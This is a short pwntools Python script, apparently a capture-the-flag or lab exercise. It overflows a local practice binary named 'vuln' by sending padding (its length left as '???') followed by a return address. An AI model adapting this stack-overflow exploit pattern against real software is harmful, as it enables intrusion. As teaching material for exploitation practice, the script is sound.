#!/usr/bin/python3
from pwn import *

p = process("vuln")

buf = b""
buf += b'A' * ???
buf += p64(0x00400577)

p.send(buf)
print(p.recv())

p.close()
